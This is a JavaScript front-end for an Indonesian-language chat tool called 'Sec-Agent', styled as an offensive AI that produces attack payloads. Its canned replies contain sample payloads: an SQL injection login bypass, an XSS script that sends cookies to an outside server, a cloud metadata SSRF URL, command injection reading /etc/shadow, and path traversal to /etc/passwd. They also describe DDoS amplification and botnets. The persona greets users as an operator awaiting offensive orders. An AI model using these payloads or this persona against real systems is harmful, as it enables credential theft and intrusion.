const chatContainer = document.getElementById('chat-container');
const userInput = document.getElementById('user-input');
const languageSelector = document.getElementById('language-selector');

let conversation = [];
let abortController = null;
let lastConceptualAnswer = "";

const generalGreetings = [
    "Sistem Enterprise Sec-Agent aktif. Jalur enkripsi established. Menunggu parameter target dari Anda.",
    "Protokol komunikasi aman berhasil diinisiasi. Sec-Agent siap mengekstrak otomasi kode. Silakan masukkan skenario audit.",
    "Neural link map terhubung sempurna. Masukkan detail kerentanan target untuk memulai generasi payload.",
    "Sec-Agent v1.0.6 online. Menunggu instruksi operasi ofensif berikutnya, Operator."
];

const identityResponses = [
    "Agent AI ini dirancang secara eksklusif oleh Drajat Akbar Dzakwan. Sistem dalam kondisi prima dan siap eksekusi.",
    "Saya adalah Sec-Agent, core AI otomasi simulasi Red Team yang dikembangkan oleh Dzakwan untuk kebutuhan audit siber.",
    "Identitas terverifikasi: Otomasi Sec-Agent buatan Drajat Akbar Dzakwan. Hak akses root diberikan, siap menerima perintah."
];

const conceptExplanations = {
    sql: [
        "SQL Injection (SQLi) terjadi ketika input pengguna memanipulasi struktur query database. Contoh payload dasar: ' OR 1=1 -- . Untuk mensimulasikan ekstraksi data atau bypass otentikasi secara spesifik, silakan masukkan parameter target dan skenario auditnya.",
        "Melalui SQLi, penyerang dapat membaca hingga menghapus data sensitif. Tekniknya mencakup Error-based, UNION-based, hingga Time-based Blind (misal: SLEEP(5)). Berikan saya target operasi untuk merakit payload PoC kustom.",
        "Database backend sering kali gagal mensanitasi input. SQL Injection mengeksploitasi ini untuk memanipulasi logika query. Berikan saya parameter target untuk mensimulasikan bypass atau ekstraksi data.",
        "Kerentanan ini sering ditemukan pada form login atau parameter URL yang tidak menerapkan prepared statements. Berikan endpoint untuk memulai pengujian payload otomatis.",
        "Eksploitasi SQLi tingkat lanjut dapat memanfaatkan fungsi out-of-band (OOB) via interaksi DNS. Tentukan target lab yang valid untuk kalkulasi PoC simulasi penuh."
    ],
    xss: [
        "Cross-Site Scripting (XSS) memungkinkan injeksi script berbahaya ke browser korban. Contoh payload Reflected XSS: <script>fetch('http://server/?c='+document.cookie)</script>. Tentukan target Anda untuk mulai merancang simulasi bypass WAF.",
        "Kerentanan XSS terbagi menjadi Stored, Reflected, dan DOM-based dengan tujuan mulai dari pencurian sesi hingga defacement. Masukkan spesifikasi URL target agar saya dapat merancang vektor injeksi JavaScript yang presisi.",
        "Injeksi payload XSS dapat membajak sesi pengguna langsung dari browser mereka. Apakah target Anda memfilter tag HTML? Spesifikasikan endpoint-nya agar saya bisa menyesuaikan vektor serangan.",
        "Payload XSS modern sering kali disandikan menggunakan base64 atau manipulasi String.fromCharCode untuk menghindari deteksi filter keamanan. Masukkan target operasi Anda.",
        "Melalui Blind XSS, penyerang dapat menyusupkan payload yang dieksekusi tanpa disadari di dashboard admin backend. Apakah Anda memiliki endpoint target untuk demonstrasi ini?"
    ],
    ssrf: [
        "Server-Side Request Forgery (SSRF) memaksa server target untuk mengakses URL internal. Contoh eksploitasi pada Cloud: http://169.254.169.254/latest/meta-data/ untuk mencuri kredensial instance. Spesifikasikan endpoint target Anda.",
        "SSRF adalah celah mematikan untuk membobol perimeter intranet dan memindai port internal yang tersembunyi. Saya memiliki kalkulasi taktik bypass desimal dan pemetaan IPv6. Silakan tentukan target URL-nya.",
        "Dengan SSRF, kita bisa menjadikan server target sebagai proxy untuk menyerang jaringan internalnya sendiri. Masukkan spesifikasi target untuk menguji kerentanan parsing URL mereka.",
        "Eksploitasi SSRF sering menargetkan port internal seperti localhost:6379 untuk manipulasi database cache Redis tanpa otentikasi. Spesifikasikan URL aplikasi yang rentan.",
        "Selain ekstraksi metadata cloud, SSRF dapat dipadukan dengan gopher:// protocol untuk mencapai eksekusi perintah jarak jauh. Berikan saya konteks target untuk mulai merakit payload."
    ],
    ddos: [
        "Distributed Denial of Service (DDoS) membanjiri resource target hingga lumpuh. Contoh teknik: SYN Flood pada Layer 4 atau Slowloris pada Layer 7. Sebagai AI PoC, berikan parameter target yang sah jika ini adalah uji beban resmi.",
        "Tujuan DDoS adalah menghancurkan availability sistem. Simulasi stress-test memerlukan parameter terukur agar tidak merusak infrastruktur secara permanen. Masukkan detail target lab Anda untuk kalkulasi trafik.",
        "Simulasi DDoS memerlukan kalkulasi bandwidth dan arsitektur botnet yang presisi. Untuk menghindari kerusakan permanen pada infrastruktur, pastikan Anda memberikan target lab yang sudah diisolasi.",
        "Serangan amplifikasi seperti DNS atau NTP Reflection memanfaatkan server pihak ketiga untuk melumpuhkan target utama. Masukkan parameter lab untuk kalkulasi volume serangan teoretis.",
        "Botnet IoT sering digunakan untuk mendistribusikan beban serangan DDoS ke ribuan alamat IP acak. Spesifikasikan parameter target untuk simulasi pengujian ketahanan server."
    ],
    rce: [
        "Remote Code Execution (RCE) adalah kerentanan kritikal dimana penyerang mengeksekusi command sistem operasi dari jarak jauh. Contoh eksploitasi: ; id atau | cat /etc/shadow. Berikan saya target server untuk demonstrasi.",
        "RCE memungkinkan pengambilalihan server (Takeover) secara penuh. Seringkali dipicu oleh Insecure Deserialization atau Unrestricted File Upload. Silakan masukkan skenario audit dan target untuk membuat payload reverse shell.",
        "Mengeksekusi arbitrary code di server target adalah tujuan utama dari RCE. Ini bisa berawal dari celah upload file atau manipulasi fungsi eval(). Tentukan target Anda untuk eksekusi PoC.",
        "Akses shell interaktif adalah hasil akhir dari eksploitasi RCE yang sukses. Tentukan arsitektur OS target agar saya bisa menyusun reverse shell tingkat lanjut yang tersembunyi.",
        "RCE dapat dicapai melalui eksploitasi buffer overflow pada level alokasi memori sistem. Untuk simulasi berbasis web standar, berikan saya spesifikasi HTTP target yang rentan."
    ],
    lfi: [
        "Local File Inclusion (LFI) memungkinkan pembacaan file sensitif pada server akibat kelemahan path traversal. Contoh payload: ../../../../etc/passwd atau menggunakan filter PHP wrapper. Tentukan target Anda.",
        "Melalui LFI, attacker dapat membaca source code atau log file yang bisa berujung pada RCE via Log Poisoning. Masukkan spesifikasi target web server Anda agar saya dapat merancang struktur payload direktori traversal.",
        "LFI mengeksploitasi parameter dinamis untuk membaca file lokal server. Jika digabungkan dengan log file, ini bisa diekskalasi menjadi eksekusi kode. Berikan saya URL target untuk merakit payload traversal.",
        "Teknik eksploitasi LFI sering membutuhkan null byte poison (%00) pada arsitektur sistem operasi lama. Apakah target lab Anda menggunakan versi PHP usang? Spesifikasikan endpoint-nya.",
        "Pembacaan file konfigurasi kritis seperti /etc/passwd atau /proc/self/environ adalah tahap eskalasi pasca penemuan celah LFI. Berikan parameter target yang valid untuk PoC eksfiltrasi file."
    ],
    general: [
        "Offensive security mencakup fase Reconnaissance, Scanning, Exploitation, dan Post-Exploitation. Dalam simulasi ini, saya berfokus pada automasi eksploitasi. Spesifikasikan jenis kerentanan (seperti RCE, SQLi, LFI) beserta targetnya untuk memulai studi kasus praktikal.",
        "Lanskap keamanan siber penuh dengan celah seperti Broken Access Control, Injection, hingga Insecure Design. Untuk mempelajari mekanisme serangannya secara mendalam, saya membutuhkan konteks. Berikan saya skenario serangan dan target lab Anda.",
        "Konsep dasar penetrasi sistem telah terindeks sepenuhnya dalam neural network saya. Namun, arsitektur Sec-Agent dirancang optimal untuk menghasilkan kode Proof-of-Concept. Berikan saya skenario konkret dengan target yang sah untuk mendemonstrasikannya.",
        "Setiap kerentanan memiliki karakteristik unik. Mulai dari manipulasi memori hingga eksploitasi logika aplikasi. Tentukan jenis bug yang ingin Anda pelajari beserta target lab-nya untuk simulasi langsung.",
        "Audit keamanan sistem wajib dilakukan secara komprehensif, mencakup fase statis maupun dinamis. Tentukan vektor kerentanan spesifik atau protokol jaringan yang ingin Anda eksploitasi untuk memulai sesi.",
        "Sistem saya mengindeks ribuan pola payload dari database kerentanan terbaru. Untuk menghindari output yang tidak relevan, pastikan Anda mengonfirmasi target operasi dan skenario kerentanan spesifik."
    ]
};

function speakCyberText(text) {
    window.speechSynthesis.cancel();
    const utterance = new SpeechSynthesisUtterance(text);
    utterance.rate = 1.0;
    utterance.pitch = 0.3;
    utterance.lang = 'id-ID';
    window.speechSynthesis.speak(utterance);
}

function stripMarkdown(md) {
    return md.replace(/```[\s\S]*?```/g, 'Payload cybersecurity telah diterima.')
             .replace(/`([^`]+)`/g, '$1')
             .replace(/(\*|_|~|#|\>)/g, '');
}

function showQuickReply(userText, agentResponse, speak = false) {
    appendMessage('user', userText);
    userInput.value = '';
    userInput.style.height = 'auto';
    appendMessage('agent', agentResponse);
    if (speak) {
        speakCyberText(agentResponse);
    }
}

async function sendMessage() {
    const text = userInput.value.trim();
    if (!text) return;

    const textLower = text.toLowerCase();
    const greetingPattern = /\b(halo|hai|hola|hi|test|cek|pagi|siang|sore|malam|siapa kamu|kamu siapa|fungsi|tujuan)\b/i;
    const conceptualPattern = /\b(sql injection|sqli|sql|xss|csrf|ssrf|ddos|dos|rce|lfi|apa itu|jelaskan|definisi|pengertian|maksud|bagaimana cara|tutorial|belajar|dasar|fundamental|konsep|teori|perbedaan|jenis|tipe|contoh|bug|kerentanan)\b/i;

    if (textLower === 'clear') {
        chatContainer.innerHTML = '';
        userInput.value = '';
        userInput.style.height = 'auto';
        conversation = [];
        return;
    }

    if (textLower === 'whoami' || greetingPattern.test(textLower)) {
        let identity = "";

        if (textLower === 'whoami') {
            identity = "Agent AI ini dirancang secara eksklusif oleh Drajat Akbar Dzakwan. Sistem dalam kondisi prima dan siap untuk operasi eksploitasi tingkat lanjut.";
            showQuickReply(text, identity, true);
            return;
        }

        if (textLower.includes('siapa kamu') || textLower.includes('kamu siapa') || textLower.includes('fungsi') || textLower.includes('tujuan')) {
            do {
                identity = identityResponses[Math.floor(Math.random() * identityResponses.length)];
            } while (identity === lastConceptualAnswer && identityResponses.length > 1);
            lastConceptualAnswer = identity;
        } else {
            do {
                identity = generalGreetings[Math.floor(Math.random() * generalGreetings.length)];
            } while (identity === lastConceptualAnswer && generalGreetings.length > 1);
            lastConceptualAnswer = identity;
        }

        showQuickReply(text, identity);
        return;
    }

    if (conceptualPattern.test(textLower) && !textLower.includes('target:') && !textLower.includes('skenario audit:')) {
        let answerArray = conceptExplanations.general;

        if (/\b(sql|sqli)\b/.test(textLower)) {
            answerArray = conceptExplanations.sql;
        } else if (/\b(xss|cross site)\b/.test(textLower)) {
            answerArray = conceptExplanations.xss;
        } else if (/\b(ssrf)\b/.test(textLower)) {
            answerArray = conceptExplanations.ssrf;
        } else if (/\b(ddos|dos)\b/.test(textLower)) {
            answerArray = conceptExplanations.ddos;
        } else if (/\b(rce)\b/.test(textLower)) {
            answerArray = conceptExplanations.rce;
        } else if (/\b(lfi)\b/.test(textLower)) {
            answerArray = conceptExplanations.lfi;
        }

        let randomAnswer;
        do {
            randomAnswer = answerArray[Math.floor(Math.random() * answerArray.length)];
        } while (randomAnswer === lastConceptualAnswer && answerArray.length > 1);
        lastConceptualAnswer = randomAnswer;

        showQuickReply(text, randomAnswer);
        return;
    }

    const userMsgIndex = conversation.length;
    appendMessage('user', text);
    userInput.value = '';
    userInput.style.height = 'auto';
    conversation.push({ role: 'user', text });

    const thinkingId = 'processing-' + Date.now();
    const loaderHTML = `<div class="loading-wrapper"><span class="spinner"></span><span class="pulse-text">Initiating neural stream & bypassing protocols...</span></div>`;
    appendMessage('loading', loaderHTML, thinkingId);

    abortController = new AbortController();

    try {
        const response = await fetch('/api/chat', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                conversation,
                language: languageSelector.value
            }),
            signal: abortController.signal
        });

        if (!response.ok) {
            let errorMsg = 'Neural connection rejected by central server.';
            try {
                const errorData = await response.json();
                errorMsg = errorData.error || errorMsg;
            } catch (e) {
            }
            throw new Error(errorMsg);
        }

        const reader = response.body.getReader();
        const decoder = new TextDecoder();
        let fullAgentText = "";
        let agentMessageDiv = null;
        let buffer = "";
        let isMessageEvent = false;

        removeMessage(thinkingId);

        while (true) {
            const { value, done } = await reader.read();
            if (done) break;

            buffer += decoder.decode(value, { stream: true });
            const lines = buffer.split('\n');
            buffer = lines.pop();

            for (const line of lines) {
                const trimmedLine = line.trim();
                
                if (trimmedLine.startsWith('event: message')) {
                    isMessageEvent = true;
                } else if (trimmedLine.startsWith('data: ') && isMessageEvent) {
                    const dataString = trimmedLine.replace('data: ', '');
                    if (dataString) {
                        try {
                            const data = JSON.parse(dataString);
                            fullAgentText += data.content;

                            if (!agentMessageDiv) {
                                agentMessageDiv = document.createElement('div');
                                agentMessageDiv.className = 'message agent';
                                chatContainer.appendChild(agentMessageDiv);
                            }

                            let parsedHTML = marked.parse(fullAgentText);
                            let sanitizedHTML = DOMPurify.sanitize(parsedHTML);
                            
                            if (sanitizedHTML.trim() === "" && fullAgentText.trim() !== "") {
                                const escapedText = fullAgentText.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
                                sanitizedHTML = `<pre><code>${escapedText}</code></pre>`;
                            }

                            agentMessageDiv.innerHTML = sanitizedHTML;
                            
                            agentMessageDiv.querySelectorAll('pre code').forEach(block => {
                                if (block.parentNode.querySelector('.copy-btn')) return;
                                
                                const btn = document.createElement('button');
                                btn.type = 'button';
                                btn.className = 'copy-btn';
                                btn.textContent = 'Copy Payload';
                                
                                btn.onclick = () => {
                                    navigator.clipboard.writeText(block.textContent);
                                    btn.textContent = 'Copied!';
                                    btn.classList.add('copied');
                                    setTimeout(() => {
                                        btn.textContent = 'Copy Payload';
                                        btn.classList.remove('copied');
                                    }, 2000);
                                };
                                
                                block.parentNode.appendChild(btn);
                            });

                            chatContainer.scrollTop = chatContainer.scrollHeight;
                        } catch (e) {
                        }
                    }
                    isMessageEvent = false;
                } else if (trimmedLine.startsWith('event: error')) {
                    const dataString = trimmedLine.replace('data: ', '');
                    const data = JSON.parse(dataString);
                    throw new Error(data.message);
                }
            }
        }

        if (fullAgentText.trim() !== "") {
            conversation.push({ role: 'model', text: fullAgentText });
        } else {
            appendMessage('agent', `[!] SILENT DROP: Payload diblokir oleh sistem pusat tanpa respons.`);
            conversation.splice(userMsgIndex, 1);
        }

    } catch (error) {
        removeMessage(thinkingId);
        if (error.name === 'AbortError') {
            appendMessage('agent', `[!] SIGNAL: Generation interrupted by user.`);
        } else {
            appendMessage('agent', `[!] FATAL ERROR: ${error.message}`);
            conversation.splice(userMsgIndex, 1);
        }
    } finally {
        abortController = null;
    }
}

function stopGeneration() {
    if (abortController) {
        abortController.abort();
    }
}

function appendMessage(role, text, id = null) {
    const div = document.createElement('div');
    div.className = `message ${role}`;
    if (id) div.id = id;

    if (role === 'agent') {
        div.innerHTML = DOMPurify.sanitize(marked.parse(text));
    } else if (role === 'loading') {
        div.innerHTML = text; 
    } else {
        div.textContent = text;
    }

    chatContainer.appendChild(div);
    chatContainer.scrollTop = chatContainer.scrollHeight;
}

function removeMessage(id) {
    const el = document.getElementById(id);
    if (el) el.remove();
}

userInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && !e.shiftKey) {
        e.preventDefault();
        sendMessage();
    }
});

userInput.addEventListener('input', function() {
    this.style.height = 'auto';
    this.style.height = (this.scrollHeight) + 'px';
});